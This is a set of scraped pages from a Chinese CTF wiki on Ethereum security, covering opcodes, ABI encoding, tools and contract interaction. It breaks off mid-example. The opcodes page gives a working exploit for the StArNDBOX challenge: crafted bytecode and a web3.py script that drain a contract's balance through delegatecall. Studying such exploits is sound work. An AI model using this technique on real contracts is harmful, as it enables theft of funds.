|\n|Görli        |JSON-RPC over websockets|wss://goerli.infura.io/ws/v3/YOUR-PROJECT-ID |\n|Mainnet(eth2)|JSON-RPC over HTTPs     |https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io|\n|pyrmont(eth2)|JSON-RPC over websockets|wss://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io|\n|Filecoin     |JSON-RPC over HTTPs     |https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@filecoin.infura.io|\n|Filecoin     |JSON-RPC over websockets|wss://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@filecoin.infura.io|\n\n!!! note \n    注：使用时，请务必使用你的Infura仪表盘 中的项目 ID/Project ID 或 Project Secret 来替换以上 URL 中的 YOUR-PROJECT-ID 或 YOUR-PROJECT-SECRET\n\n下面是使用 web3.py 和 Infura API 与智能合约进行交互调用合约函数选择器为 0x00774360 的函数的例子\n\n```python\nfrom web3 import Web3, HTTPProvider\n\nw3 = Web3(Web3.HTTPProvider(\"https://rinkeby.infura.io/v3/YOUR-PROJECT-ID\"))\n\ncontract_address = \"0x31c883a9aa588d3f890c26c7844062d99444b5d6\"\nprivate = \"your private key\"\npublic = \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\"\n\ndef deploy(public):\n    txn = {\n        'from': Web3.toChecksumAddress(public),\n        'to': Web3.toChecksumAddress(contract_address),\n        'gasPrice': w3.eth.gasPrice,\n        'gas': 3000000,\n        'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)),\n        'value': Web3.toWei(0, 'ether'),\n        'data': '0x007743600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a6100016100016100016100016100016100650361000161fbfbf1000000000000',\n    }\n    signed_txn = w3.eth.account.signTransaction(txn, private)\n    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()\n    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\n    print(\"txn_hash=\", txn_hash)\n    return txn_receipt\n\nprint(deploy(public))\n```\n\n## tx.origin vs msg.sender\n\n- 这里区分一下 tx.origin 和 msg.sender ，msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 tx.origin 则必然是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，而且一定是账户地址而不是合约地址。\n- 给定这样一个场景如：用户通过合约 A 调合约B，此时：\n    + 对于合约 A : tx.origin 和 msg.sender 都是用户\n    + 对于合约 B : tx.origin 是用户，msg.sender 是合约 A\n", "timestamp": "2025-10-21T22:02:43.259607"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/introduction.md", "content": "# Ethereum Overview\n\n!!! info\n    CTF 中关于区块链安全的内容，目前为止，涉及到最多的便是 Ethereum 安全。\n\n## 定义\n\n> Ethereum is a decentralized, open-source blockchain featuring smart contract functionality. Ether (ETH) is the native cryptocurrency of the platform. It is the second-largest cryptocurrency by market capitalization, after Bitcoin. Ethereum is the most actively used blockchain.  ------  from [wikipedia](https://en.wikipedia.org/wiki/Ethereum)\n\nEthereum 是区块链 2.0 的代表产物，因其底层使用区块链技术，所以继承区块链的各种特性，其中有一项便是 **代码一旦上链，便难以篡改或更改**，所以我们需要额外关注它的安全。\n\n智能合约 (Smart Contract) 是 Ethereum 中最为重要的一个概念，允许在没有第三方的情况下进行可信交易，这些交易可追踪且不可逆转。\n\n## CTF 中的区块链\n\nCTF 中有关于 Ethereum Security 还是比较简单的，主要涉及到的是 Solidity Security， 下面介绍一下需要具备的基本能力。\n\n### 要求\n\n- 对区块链基本知识以及交易本质有所了解\n- 熟悉并掌握 Solidity 编程语言及以太坊虚拟机 EVM 运行机制\n- 熟悉各种测试链，包括私链\n- 熟悉 Remix、MetaMask、web3.js、web3.py 等工具或库的使用\n- 了解并掌握以太坊智能合约各种漏洞及其攻击原理\n- 对底层 opcodes 理解透彻\n- 较强的程序理解和逆向分析能力\n\n!!! note\n    注：以太坊智能合约大多数不公开源代码，而是字节码，所以需要逆向分析能力。", "timestamp": "2025-10-21T22:02:43.362211"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/opcodes.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/opcodes.md", "content": "# Ethereum Opcodes\nEthereum 中的 opcodes 有 142 种，部分常见的 opcodes 如下所示：\n\n| Uint8 | Mnomonic |      Stack Input       | Stack Output |              Expression              |\n| :---: | :------: | :--------------------: | :----------: | :----------------------------------: |\n|  00   |   STOP   |           -            |      -       |                STOP()                |\n|  01   |   ADD    |      \\| a \\| b \\|      | \\| a + b \\|  |                a + b                 |\n|  02   |   MUL    |      \\| a \\| b \\|      | \\| a * b \\|  |                a * b                 |\n|  03   |   SUB    |      \\| a \\| b \\|      | \\| a - b \\|  |                a - b                 |\n|  04   |   DIV    |      \\| a \\| b \\|      | \\| a // b \\| |                a // b                |\n|  51   |  MLOAD   |      \\| offset \\|      | \\| value \\|  |   value = memory[offset:offset+32]   |\n|  52   |  MSTORE  | \\| offset \\| value \\|  |      -       |   memory[offset:offset+32] = value   |\n|  54   |  SLOAD   |       \\| key \\|        | \\| value \\|  |         value = storage[key]         |\n|  55   |  SSTORE  |   \\| key \\| value \\|   |      -       |         storage[key] = value         |\n|  56   |   JUMP   |   \\| destination \\|    |      -       |          $pc = destination           |\n|  5B   | JUMPDEST |           -            |      -       |                  -                   |\n|  F3   |  RETURN  | \\| offset \\| length \\| |      -       | return memory[offset:offset+length]  |\n|  FD   |  REVERT  | \\| offset \\| length \\| |      -       | revert(memory[offset:offset+length]) |\n\n!!! info \n    JUMPDEST 是跳转指令的 destination，跳转指令不能跳转到没有 JUMPDEST 的地方。\n\n更多的详细 opcodes 信息可以查看 [ethervm.io](https://ethervm.io)。\n\n## 例子\n以 startCTF 2021 的 StArNDBOX 一题为例讲解一下 opcodes 的题目。\n\n本题会在部署挑战合约的时候传入 100 wei 到合约中，我们的目标是将合约的 balance 清空。题目合约的源码如下：\n\n```solidity\npragma solidity ^0.5.11;\n\nlibrary Math {\n    function invMod(int256 _x, int256 _pp) internal pure returns (int) {\n        int u3 = _x;\n        int v3 = _pp;\n        int u1 = 1;\n        int v1 = 0;\n        int q = 0;\n        while (v3 > 0){\n            q = u3/v3;\n            u1= v1;\n            v1 = u1 - v1*q;\n            u3 = v3;\n            v3 = u3 - v3*q;\n        }\n        while (u1<0){\n            u1 += _pp;\n        }\n        return u1;\n    }\n    \n    function expMod(int base, int pow,int mod) internal pure returns (int res){\n        res = 1;\n        if(mod > 0){\n            base = base % mod;\n            for (; pow != 0; pow >>= 1) {\n                if (pow & 1 == 1) {\n                    res = (base * res) % mod;\n                }\n                base = (base * base) % mod;\n            }\n        }\n        return res;\n    }\n    function pow_mod(int base, int pow, int mod) internal pure returns (int res) {\n        if (pow >= 0) {\n            return expMod(base,pow,mod);\n        }\n        else {\n            int inv = invMod(base,mod);\n            return expMod(inv,abs(pow),mod);\n        }\n    }\n    \n    function isPrime(int n) internal pure returns (bool) {\n        if (n == 2 ||n == 3 || n == 5) {\n            return true;\n        } else if (n % 2 ==0 && n > 1 ){\n            return false;\n        } else {\n            int d = n - 1;\n            int s = 0;\n            while (d & 1 != 1 && d != 0) {\n                d >>= 1;\n                ++s;\n            }\n            int a=2;\n            int xPre;\n            int j;\n            int x = pow_mod(a, d, n);\n            if (x == 1 || x == (n - 1)) {\n                return true;\n            } else {\n                for (j = 0; j < s; ++j) {\n                    xPre = x;\n                    x = pow_mod(x, 2, n);\n                    if (x == n-1){\n                        return true;\n                    }else if(x == 1){\n                        return false;\n                    }\n                }\n            }\n            return false;\n        }\n    }\n    \n    function gcd(int a, int b) internal pure returns (int) {\n        int t = 0;\n        if (a < b) {\n            t = a;\n            a = b;\n            b = t;\n        }\n        while (b != 0) {\n            t = b;\n            b = a % b;\n            a = t;\n        }\n        return a;\n    }\n    function abs(int num) internal pure returns (int) {\n        if (num >= 0) {\n            return num;\n        } else {\n            return (0 - num);\n        }\n    }\n    \n}\n\ncontract StArNDBOX{\n    using Math for int;\n    constructor()public payable{\n    }\n    modifier StAr() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n    function StArNDBoX(address _addr) public payable{\n        \n        uint256 size;\n        bytes memory code;\n        int res;\n        \n        assembly{\n            size := extcodesize(_addr)\n            code := mload(0x40)\n            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))\n            mstore(code, size)\n            extcodecopy(_addr, add(code, 0x20), 0, size)\n        }\n        for(uint256 i = 0; i < code.length; i++) {\n            res = int(uint8(code[i]));\n            require(res.isPrime() == true);\n        }\n        bool success;\n        bytes memory _;\n        (success, _) = _addr.delegatecall(\"\");\n        require(success);\n    }\n}\n```\n\n可以看到题目的 `StArNDBoX` 函数可以获取任意地址的合约并检测该合约的每个字节是否为质数，如果通过检查则使用 `delegatecall` 来调用目标合约。\n\n但由于该合约中的 `isPrime` 函数并不是完整的质数检查函数，`00` 和 `01` 也可以通过检查，因此我们可以构造如下的字节码：\n\n```\n// 0x6100016100016100016100016100016100650361000161fbfbf1\n61 00 01 | PUSH2 0x0001\n61 00 01 | PUSH2 0x0001\n61 00 01 | PUSH2 0x0001\n61 00 01 | PUSH2 0x0001\n61 00 01 | PUSH2 0x0001\n61 00 65 | PUSH2 0x0065\n03       | SUB\n61 00 01 | PUSH2 0x0001\n61 fb fb | PUSH2 0xfbfb\nf1       | CALL\n```\n\n来执行 `address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001)` 语句，也就是将题目合约中的 balance 转到 0x1 处，从而清空 balance 满足得到 flag 的条件。\n\n\n## 题目\n\n### starCTF 2021\n- 题目名称 StArNDBOX\n\n### RealWorld 2019\n- 题目名称 Montagy\n\n### QWB 2020\n- 题目名称 EasySandbox\n- 题目名称 EGM\n\n### 华为鲲鹏计算 2020\n- 题目名称 boxgame\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n\n## 参考\n- [Ethervm](https://ethervm.io)\n- [starCTF 2021 - StArNDBOX](https://github.com/sixstars/starctf2021/tree/main/blockchain-StArNDBOX)", "timestamp": "2025-10-21T22:02:43.471321"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/resources.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/resources.md", "content": "# 学习资源\n\n## Books\n- 《以太坊技术详解与实战》-- 以太坊创始人、首席科学家 Vitalik Buterin 倾力推荐\n- 待补充\n\n## papers\n- 智能合约 [https://github.com/hzysvilla/Academic_Smart_Contract_Papers](https://github.com/hzysvilla/Academic_Smart_Contract_Papers)\n- 区块链（包括智能合约）[https://github.com/jianyu-niu/blockchain_conference_paper](https://github.com/jianyu-niu/blockchain_conference_paper)\n- 待补充\n\n## Security Tools\n\n> 搬运自 [https://consensys.github.io/smart-contract-best-practices/security_tools/](https://consensys.github.io/smart-contract-best-practices/security_tools/)\n\n### Visualization\n\n- [Solidity Visual Auditor](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor) - This extension contributes security centric syntax and semantic highlighting, a detailed class outline and advanced Solidity code insights to Visual Studio Code\n- [Sūrya](https://github.com/ConsenSys/surya) - Utility tool for smart contract systems, offering a number of visual outputs and information about the contracts' structure. Also supports querying the function call graph.\n- [Solgraph](https://github.com/raineorshine/solgraph) - Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities.\n- [EVM Lab](https://github.com/ethereum/evmlab) - Rich tool package to interact with the EVM. Includes a VM, Etherchain API, and a trace-viewer.\n- [ethereum-graph-debugger](https://github.com/fergarrui/ethereum-graph-debugger) - A graphical EVM debugger. Displays the entire program control flow graph.\n- [Piet](https://github.com/slockit/piet) - Web application helping understand smart contract architectures. Offers graphical representation and inspection of smart contracts as well as a markdown documentation generator.\n\n### Static and Dynamic Analysis\n\n- [MythX](https://mythx.io) - MythX is a professional-grade cloud service that uses symbolic analysis and input fuzzing to [detect common security bugs](https://medium.com/consensys-diligence/detecting-the-top-4-critical-smart-contract-vulnerabilities-with-mythx-9c568d7db7a6) and [verify the correctness of smart contract code](https://medium.com/coinmonks/advanced-smart-contract-security-verification-in-remix-9630b43695e5). Using MythX requires an API key from [mythx.io](https://mythx.io).\n- [Mythril](https://github.com/ConsenSys/mythril) - The Swiss army knife for smart contract security.\n- [Slither](https://github.com/trailofbits/slither) - Static analysis framework with detectors for many common Solidity issues. It has taint and value tracking capabilities and is written in Python.\n- [Contract-Library](https://contract-library.com) - Decompiler and security analysis tool for all deployed contracts.\n- [Echidna](https://github.com/trailofbits/echidna) - The only available fuzzer for Ethereum software. Uses property testing to generate malicious inputs that break smart contracts.\n- [Manticore](https://github.com/trailofbits/manticore) - Dynamic binary analysis tool with [EVM support](https://asciinema.org/a/haJU2cl0R0Q3jB9wd733LVosL).\n- [Oyente](https://github.com/melonproject/oyente) - Analyze Ethereum code to find common vulnerabilities, based on this [paper](http://www.comp.nus.edu.sg/~loiluu/papers/oyente.pdf).\n- [Securify](https://github.com/eth-sri/securify2) - Fully automated online static analyzer for smart contracts, providing a security report based on vulnerability patterns.\n- [SmartCheck](https://tool.smartdec.net) - Static analysis of Solidity source code for security vulnerabilities and best practices.\n- [Octopus](https://github.com/quoscient/octopus) - Security Analysis tool for Blockchain Smart Contracts with support of EVM and (e)WASM.\n- [sFuzz](https://sfuzz.github.io/) - Efficient fuzzer inspired from AFL to find common vulnerabilities.\n- [Vertigo](https://github.com/JoranHonig/vertigo) - Mutation Testing for Ethereum Smart Contracts.\n\n### Weakness OSSClassifcation & Test Cases\n\n- [SWC-registry](https://github.com/SmartContractSecurity/SWC-registry/) - SWC definitions and a large repository of crafted and real-world samples of vulnerable smart contracts.\n- [SWC Pages](https://smartcontractsecurity.github.io/SWC-registry/) - The SWC-registry repo published on Github Pages\n\n### Test Coverage\n\n- [solidity-coverage](https://github.com/sc-forks/solidity-coverage) - Code coverage for Solidity testing.\n\n### Linters and Formatters\n\nLinters improve code quality by enforcing rules for style and composition, making code easier to read and review.\n\n- [Ethlint](https://github.com/duaraghav8/Ethlint) - Yet another Solidity linting.\n- [Solhint](https://github.com/protofire/solhint) - A linter for Solidity that provides both Security and Style Guide validations.\n- [Prettier](https://prettier.io/) + [Solidity Plugin](https://github.com/prettier-solidity/prettier-plugin-solidity) - Prettier enforces basic style conventions in your code.", "timestamp": "2025-10-21T22:02:43.584099"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/reverse.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/reverse.md", "content": "# Smart Contract Reverse\n\n!!! note \n    智能合约大多数代码不公开源码，公开字节码，所以需要使用逆向工具或者人工进行逆向分析。\n\n## Related Tools\n- [https://ethervm.io/decompile](https://ethervm.io/decompile)   有时候莫名其妙崩溃\n- [https://www.trustlook.com/services/smart.html](https://www.trustlook.com/services/smart.html)\n- 其他\n\n具体内容待补充\n", "timestamp": "2025-10-21T22:02:43.699626"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/selector-encoding.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/selector-encoding.md", "content": "# Function Selector and Argument Encoding\n\n> 详细可查看 [官方文档](https://docs.soliditylang.org/en/v0.8.1/abi-spec.html#)\n\n> 参考自己博客 [Function Selector and Argument Encoding](https://hitcxy.com/2021/argument-encoding/)\n\n在 Ethereum 生态系统中，ABI (Application Binary Interface，应用二进制接口) 是从区块链外部与合约进行交互以及合约与合约间进行交互的一种标准方式。数据会根据其类型按照这份手册中说明的方法进行编码。\n\n## Function Selector\n\n### 原理\n某个函数签名的 Keccak (SHA-3) 哈希的前 4 字节，指定了要调用的函数，形如 bytes4(keccak256('balanceOf(address)')) == 0x70a08231 这种形式，0x70a08231 便是 balanceOf(address) 的 Function Selector\n\n- 基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格\n- 对于 uint 类型，要转成 uint256 进行计算，比如 ownerOf(uint256) 其 Function Selector = bytes4(keccak256('ownerOf(uint256)')) == 0x6352211e\n- 函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 `()` 扩起来，详细可看下面的例子\n\n### 例子\n\n```solidity\npragma solidity >=0.4.16 <0.9.0;\npragma experimental ABIEncoderV2;\n\ncontract Demo {\n    struct Test {\n        string name;\n        string policies;\n        uint num;\n    }\n    \n    uint public x;\n    function test1(bytes3) public {x = 1;}\n    function test2(bytes3[2] memory) public  { x = 1; }\n    function test3(uint32 x, bool y) public  { x = 1; }\n    function test4(uint, uint32[] memory, bytes10, bytes memory) public { x = 1; }\n    function test5(uint, Test memory test) public { x = 1; }\n    function test6(uint, Test[] memory tests) public { x = 1; }\n    function test7(uint[][] memory,string[] memory) public { x = 1; }\n}\n\n/* 函数选择器\n{\n    \"0d2032f1\": \"test1(bytes3)\",\n    \"2b231dad\": \"test2(bytes3[2])\",\n    \"92e92919\": \"test3(uint32,bool)\",\n    \"4d189ce2\": \"test4(uint256,uint32[],bytes10,bytes)\",\n    \"4ca373dc\": \"test5(uint256,(string,string,uint256))\",\n    \"ccc5bdd2\": \"test6(uint256,(string,string,uint256)[])\",\n    \"cc80bc65\": \"test7(uint256[][],string[])\",\n    \"0c55699c\": \"x()\"\n}\n*/\n```\n\n## Function Selector and Argument Encoding\n\n### 原理\n\n* 动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其 `offset`、`length`、`data`\n    - 先把参数顺序存储：如果是定长数据类型，直接存储其 `data`，如果是变长数据类型，先存储其 `offset`\n    - 顺序遍历变长数据：先存储 `offset`，对于第一个变长数据，先存储其 `offset = 0x20 * number` ( `number` 是函数参数的个数 )；对于下一个变长数据，其 `offset = offset_of_prev + 0x20 + 0x20 * number` (第一个 `0x20` 是存储前一个变长数据的长度占用的大小，`number` 是前一个变长数据的元素个数)\n    - 顺序遍历变长数据：存储完 `offset` ，接着就是遍历每个变长数据，分别存储其 `length` 和 `data`\n    - ( `ps:` 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 `offset = 0x20 * num` ，`num` 是结构体元素的个数 )\n\n### 例子\n\n针对上述的合约例子的 7 个函数，其函数调用最终编码如下\n\n- test1(\"0x112233\")\n\n```\n0x0d2032f1                                                             // function selector\n0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // data of first parameter\n```\n\n- test2([\"0x112233\",\"0x445566\"])\n\n```\n0x2b231dad                                                             // function selector\n0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // first data of first parameter\n1 - 0x4455660000000000000000000000000000000000000000000000000000000000 // second data of first parameter\n```\n\n- test3(0x123,1)\n\n```\n0x92e92919                                                             // function selector\n0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter\n1 - 0x0000000000000000000000000000000000000000000000000000000000000001 // data of second parameter\n```\n\n- test4(0x123,[\"0x11221122\",\"0x33443344\"],\"0x31323334353637383930\",\"0x3132333435\")\n\n```\n0x4d189ce2                                                             // function selector\n0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter\n1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter\n2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter\n3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter\n4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter\n5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter\n6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter\n7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter\n8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter\n\n/* 一些解释说明\ndata of first parameter: uint 定长类型，直接存储其 data\noffset of second parameter: uint32[] 动态数组，先存储其 offset=0x20*4 ( 4 代表函数参数的个数 ) \ndata of third parameter: bytes10 定长类型，直接存储其 data\noffset of forth parameter: bytes 变长类型，先存储其 offset=0x80+0x20*3=0xe0 (0x80 是前一个变长类型的 offset，3 是前一个变长类型存储其长度和两个元素占用的插槽个数)\nlength of second parameter: 存储完 data 或者 offset 后，便开始存储变长数据的 length 和 data，这里是第二个参数的长度\nfirst data of second parameter: 第二个参数的第一个数据\nsecond data of second parameter: 第二个参数的第二个数据\nlength of forth parameter: 上面就把第二个变长数据存储完成，这里就是存储下一个变长数据的长度\ndata of forth parameter: 第四个参数的数据\n*/\n```\n\n- test5(0x123,[\"cxy\",\"pika\",123])\n\n```\n0x4ca373dc                                                             // function selector\n0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter\n1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter\n2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // first data offset of second parameter\n3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // second data offset of second parameter\n4 - 0x000000000000000000000000000000000000000000000000000000000000007b // third data of second parameter\n5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // first data length of second parameter\n6 - 0x6378790000000000000000000000000000000000000000000000000000000000 // first data of second parameter\n7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // second data length of second parameter\n8 - 0x70696b6100000000000000000000000000000000000000000000000000000000 // second data of second parameter\n\n/* 一些解释说明\ndata of first parameter: uint 定长类型，直接存储其 data\noffset of second parameter: 结构体，先存储其 offset=0x20*2 ( 2 代表函数参数的个数) \nfirst data offset of second parameter: 结构体内元素可当成函数参数拆分，有三个元素，因第一个元素是 string 类型，所以先存储其 offset=0x20*3=0x60\nsecond data offset of second parameter: 结构体第二个元素是 string 类型，先存储其 offset=0x60+0x20+0x20=0xa0 (第一个 0x20 是存储第一个 string 的长度所占大小，第二个 0x20 是存储第一个 string 的数据所占大小)\nthird data of second parameter: 结构体第三个元素是 uint 定长类型，直接存储其 data\nfirst data length of second parameter: 存储结构体第一个元素的 length\nfirst data of second parameter: 存储结构体第一个元素的 data\nsecond data length of second parameter: 存储结构体第二个元素的 length\nsecond data of second parameter: 存储结构体第二个元素的 data\n*/\n```\n\n- test6(0x123,[[\"cxy1\",\"pika1\",123], [\"cxy2\",\"pika2\",456]])\n\n```\n由于是结构体数组，所以需要拆分，由内向外。内部是两个结构体，分别来看其 encoding\n\n对于 [\"cxy1\",\"pika1\",123] 结构体，其 encoding 如下（ 直接当成函数参数 encoding ）\n0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\"\n1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\"\n2 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123\n3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\"\n4 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\"\n5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\"\n6 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\"\n\n对于 [\"cxy2\",\"pika2\",456] 结构体，其 encoding 如下（直接当成函数参数 encoding ）\n0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\"\n1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\"\n2 - 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456\n3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\"\n4 - 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\"\n5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\"\n6 - 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\"\n\n由于是结构体，所以还需要 [\"cxy1\",\"pika1\",123] 的 offset 和 [\"cxy2\",\"pika2\",456] 的 offset，如下\n0 - a                                                                  // offset of [\"cxy1\",\"pika1\",123]\n1 - b                                                                  // offset of [\"cxy2\",\"pika2\",456]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\"\n3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\"\n4 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123\n5 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\"\n6 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\"\n7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\"\n8 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\"\n9 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\"\n10- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\"\n11- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456\n12- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\"\n13- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\"\n14- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\"\n15- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\"\na指向 offset of \"cxy1\"，所以 a=0x20*2=0x40\nb指向 offset of \"cxy2\"，所以 b=0x20*9=0x120\n\n由于是结构体数组，结构体外面是数组，所以要按照动态数组encoding的方法，如下\n0 - c                                                                  // offset of [[\"cxy1\",\"pika1\",123],[\"cxy2\",\"pika2\",456]]\n1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter\n2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"]\n3 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"]\n4 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\"\n5 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\"\n6 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123\n7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\"\n8 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\"\n9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\"\n10- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\"\n11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\"\n12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\"\n13- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456\n14- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\"\n15- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\"\n16- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\"\n17- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\"\nc 是函数参数的第二个参数，是动态类型，所以 offset c = 0x20*2 = 0x40\n\n所以总的 encoding 如下\n0xccc5bdd2                                                             // function selector\n0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // encoding of 0x123\n1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter\n2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter\n3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"]\n4 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"]\n5 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\"\n6 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\"\n7 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123\n8 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\"\n9 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\"\n10- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\"\n11- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\"\n12- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\"\n13- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\"\n14- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456\n15- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\"\n16- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\"\n17- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\"\n18- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\"\n```\n\n- test7([[1,2],[3]],[\"one\",\"two\",\"three\"])\n\n```\n同理进行由内向外的拆分，首先是 [[1,2],[3]] 动态数组中的 [1, 2] 和 [3] 两个动态数组\n0 - a                                                                  // offset of [1,2]\n1 - b                                                                  // offset of [3]\n2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2]\n3 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1\n4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2\n5 - 